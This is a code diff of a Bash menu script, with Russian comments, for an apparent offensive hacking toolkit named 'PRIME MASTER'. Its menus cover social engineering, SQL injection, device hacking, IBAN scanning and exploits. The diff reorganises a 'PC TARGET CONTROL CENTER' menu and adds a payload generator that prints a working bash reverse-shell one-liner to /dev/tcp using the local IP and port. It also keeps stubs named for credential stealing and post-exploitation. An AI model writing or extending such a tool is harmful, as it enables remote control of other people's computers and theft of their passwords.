@@ -459,8 +459,8 @@ EOF
 # --- Конец  Модулей ---
 # --- ГЛАВНОЕ МЕНЮ ---
 run_main_menu() {
-    local main_names="GHOST_COMMANDER SOCIAL_ENG MUTAGEN_SQL DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PASS_LAB CRYPTO_FORGE Ghost_Engine ULTIMATE_EXPLOIT PC_RECOVERY INTELLIGENCE_CENTER SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
-    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_exploit_hub run_smart_osint_engine run_iban_analyzer run_pass_lab run_crypto_forge run_vulnerability_scanner run_prime_exploiter_v5 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
+    local main_names="GHOST_COMMANDER SOCIAL_ENG MUTAGEN_SQL DEVICE_HACK TOTAL_OSINT IBAN_SCAN PASS_LAB CRYPTO_FORGE Ghost_Engine ULTIMATE_EXPLOIT PC_RECOVERY INTELLIGENCE_CENTER SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
+    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_smart_osint_engine run_iban_analyzer run_pass_lab run_crypto_forge run_vulnerability_scanner run_prime_exploiter_v5 pc_password_recovery run_view_loot run_system_info run_servers run_repair update_prime exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
@@ -480,23 +480,29 @@ run_device_hack() {
 
 # --- Модули: RECOVERY & PASSWORDS ---
 pc_password_recovery() {
-    local p_names="Extract_Reset_OS_Password Forensic_Threat_Scan"
-    local p_funcs="run_pc_recovery_ultimate run_forensic_scanner"
-    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
+    # Теперь здесь весь цикл работы с целью
+    local p_names="Generate_Reverse_Shell Extract_Reset_Passwords Forensic_Auto_Defense"
+    local p_funcs="pc_gen_payload run_pc_recovery_ultimate run_forensic_scanner"
+    
+    prime_dynamic_controller "PC TARGET CONTROL CENTER" "$p_names" "$p_funcs"
 }
 
-# --- EXPLOIT HUB ---
-run_exploit_hub() {
-    local ex_names="PC_Control"
-    local ex_funcs="run_pc_control"
-    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
+# Вспомогательные функции-мостики (для чистоты кода)
+pc_gen_payload() {
+    print_header "PAYLOAD GENERATOR"
+    local l_ip=$(ifconfig eth0 2>/dev/null | awk '/inet / {print $2}' || echo "127.0.0.1")
+    echo -e "${Y}Current LHOST:${NC} $l_ip"
+    echo -en "${Y}Enter LPORT (4444): ${NC}"; read -r l_port
+    [[ -z "$l_port" ]] && l_port="4444"
+    show_progress 3 "COMPILING REVERSE SHELL"
+    echo -e "\n${G}RAW BASH:${NC}\nbash -i >& /dev/tcp/$l_ip/$l_port 0>&1\n"
+    pause
 }
 
-run_pc_control() {
-    local pc_names="Payload_Generator Password_Stealer Post-Exploit"
-    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
-    prime_dynamic_controller "PC CONTROL" "$pc_names" "$pc_funcs"
-}
+# Редиректы на существующие модули, чтобы не дублировать код
+pc_steal_creds() { run_pc_recovery_ultimate; }
+pc_post_exploit() { run_forensic_scanner; }
+
 
 # --- SECURITY & DATA HUB ---
 run_servers() {
@@ -944,6 +950,7 @@ run_sql_adaptive() {
     rm -rf "$out_dir"
     pause
 }
+
 
 run_network_intelligence() {
     print_header "NETWORK INTELLIGENCE: TRAFFIC ANALYZER"
